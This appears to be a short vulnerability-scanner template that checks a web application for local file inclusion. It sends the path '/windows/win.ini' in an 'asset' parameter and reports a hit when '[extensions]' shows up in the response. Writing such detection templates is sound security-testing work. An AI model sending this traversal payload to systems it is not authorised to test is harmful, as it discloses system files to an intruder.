id: lfi6-1235
name: 'Traversal in asset'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via asset'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      asset:
        - '/windows/win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
